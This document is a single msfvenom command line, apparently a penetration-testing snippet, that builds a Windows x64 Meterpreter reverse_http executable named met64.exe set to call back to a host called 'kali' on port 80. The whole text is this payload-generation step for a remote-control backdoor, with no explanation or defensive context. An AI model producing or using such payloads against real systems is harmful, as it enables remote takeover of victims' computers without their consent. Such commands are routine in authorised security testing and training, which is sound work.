msfvenom -p windows/x64/meterpreter/reverse_http EXITFUNC=thread -a x64 --platform win LHOST=kali LPORT=80 -f exe -o met64.exe
